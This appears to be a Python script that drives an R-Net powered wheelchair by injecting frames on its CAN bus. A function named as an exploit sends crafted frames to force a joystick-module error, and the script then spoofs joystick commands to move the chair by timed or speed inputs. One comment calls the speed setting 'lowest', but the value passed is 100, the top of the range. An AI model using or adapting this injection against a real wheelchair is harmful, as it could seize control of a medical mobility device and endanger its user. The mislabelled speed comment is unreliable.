import socket, sys, os, array, threading
import keyboard
from time import *
from fcntl import ioctl
from can2RNET import *


debug = True

def dec2hex(dec,hexlen):  #convert dec to hex with leading 0s and no '0x'
    h=hex(int(dec))[2:]
    l=len(h)
    if h[l-1]=="L":
        l-=1  #strip the 'L' that python int sticks on
    if h[l-2]=="x":
        h= '0'+hex(int(dec))[1:]
    return ('0'*hexlen+h)[l:l+hexlen]

def induce_JSM_error(cansocket):
    for i in range(0,3):
        cansend(cansocket,'0c000000#')

def RNET_JSMerror_exploit(cansocket):
    print("Waiting for JSM heartbeat")
    canwait(cansocket,"03C30F0F:1FFFFFFF")
    t=time()+0.20

    print("Waiting for joy frame")
    joy_id = wait_rnet_joystick_frame(cansocket,t)
    print("Using joy frame: "+joy_id)

    induce_JSM_error(cansocket)
    #print("3 x 0c000000# sent")

    return(joy_id)

#THREAD: sends RnetJoyFrame every mintime seconds
def send_joystick_canframe(s,joy_id,duration):
    joyframe = joy_id+'#'+dec2hex(0,2)+dec2hex(0,2)
    cansend(s,joyframe)
    startTime = time()
    endTime = startTime + duration
    while True:
        if keyboard.is_pressed('f5'):
            sys.exit()
        else:
            joyframe = joy_id+'#'+dec2hex(joystick_x,2)+dec2hex(joystick_y,2)
            cansend(s,joyframe)
            if time() > endTime:
                break
#Waits for any frame containing a Joystick position
#Returns: JoyFrame extendedID as text
def wait_rnet_joystick_frame(can_socket, start_time):
    frameid = ''

    while frameid[0:3] != '020':  #just look for joystick frame ID (no extended frame)
        cf, addr = can_socket.recvfrom(16) #this is a blocking read.... so if there is no canbus traffic it will sit forever (to fix!)
        candump_frame = dissect_frame(cf)
        frameid = candump_frame.split('#')[0]
        if time() > start_time:
             print("JoyFrame wait timed out ")
             return('Err!')
    return(frameid)


def inject_rnet_joystick_frame(can_socket, rnet_joystick_id,duration):
    rnet_joystick_frame_raw = build_frame(rnet_joystick_id + "#0000") #prebuild the frame we are waiting on
    startTime = time()
    cansend(can_socket, rnet_joystick_id + '#' + dec2hex(0, 2) + dec2hex(0, 2))
    while rnet_threads_running:
        while time() < startTime + duration:
            cf, addr = can_socket.recvfrom(16)
            if cf == rnet_joystick_frame_raw:
                cansend(can_socket, rnet_joystick_id + '#' + dec2hex(joystick_x, 2) + dec2hex(joystick_y, 2))

#Set speed_range: 0% - 100%
def RNETsetSpeedRange(cansocket,speed_range):
    if speed_range>=0 and speed_range<=0x64:
        cansend(cansocket,'0a040100#'+dec2hex(speed_range,2))
    else:
        print('Invalid RNET SpeedRange: ' + str(speed_range))


#do very little and output something as sign-of-life
def watch_and_wait():
    started_time = time()
    while threading.active_count() > 0 and rnet_threads_running:
        sleep(0.5)
        print(str(round(time()-started_time,2))+'\tX: '+dec2hex(joystick_x,2)+'\tY: '+dec2hex(joystick_y,2)+ '\tThreads: '+str(threading.active_count()))

#does not use a thread queue.  Instead just sets a global flag.
def kill_rnet_threads():
    global rnet_threads_running
    rnet_threads_running = False

# Function to move wheelchair with user inputted time and direction
def timed_movement():
    global joystick_x,joystick_y
    
    # Pre-determined direction hex codes to send to the chair
    directions = {"left":int(0x9d),"right":int(0x64),"forward":int(0x64),"reverse":int(0x9d)}
    # Begins process of sending signals to the wheelchair
    while True:
        # User inputted instructions
        direction = input("What direction do you want to go? (left,right,forward,reverse)")
        duration = input("For how many seconds?")
        duration = int(duration)     
        # Determines vector
        if direction == "right" or direction == "left":
            joystick_x = directions[direction]
            joystick_y = 0
        elif direction == "forward" or direction == "reverse":
            joystick_x = 0
            joystick_y = directions[direction]
        send_joystick_canframe(cansocket,rnet_joystick_id,duration)
        # Run the loop again?
        another = input("Do you want to go again? (yes, no)")
        if another == "no":
            break
    sleep(0.5)

def forward_speed_movement():
    global joystick_x,joystick_y
    
    # Begins process of sending signals to the wheelchair
    while True:
        # User inputted instructions
        speed = input("Input dec y-value (reverse: fastest=157, slowest=240) (forward: fastest = 100, slowest = 16")
        duration = input("For how many seconds?")
        duration = int(duration) 

        joystick_x = 0
        joystick_y = speed

        send_joystick_canframe(cansocket,rnet_joystick_id,duration)
        # Run the loop again?
        another = input("Do you want to go again? (yes, no)")
        if another == "no":
            break
    sleep(0.5)



if __name__ == "__main__":
    global cansocket
    global rnet_threads_running
    global joystick_x
    global joystick_y
    global rnet_joystick_id
    rnet_threads_running = True
    cansocket = opencansocket(0)

    # To determine if the wheelchair is connected via CAN
    start_time = time() + .20
    rnet_joystick_id = wait_rnet_joystick_frame(cansocket, start_time) #t=timeout time
    if rnet_joystick_id == 'Err!':
        print('No RNET-Joystick frame seen within minimum time')
        sys.exit()

    # set chair's speed to the lowest setting.
    chair_speed_range = 100
    RNETsetSpeedRange(cansocket, chair_speed_range)
    rnet_joystick_id = RNET_JSMerror_exploit(cansocket)
    
    selection = input("Timed or speed trial? (timed,speed)")
    if selection == "timed":
        timed_movement()
    elif selection == "speed":
        forward_speed_movement()



    #closecansocket(cansocket)
    print(rnet_threads_running)
    print("Exiting")

			
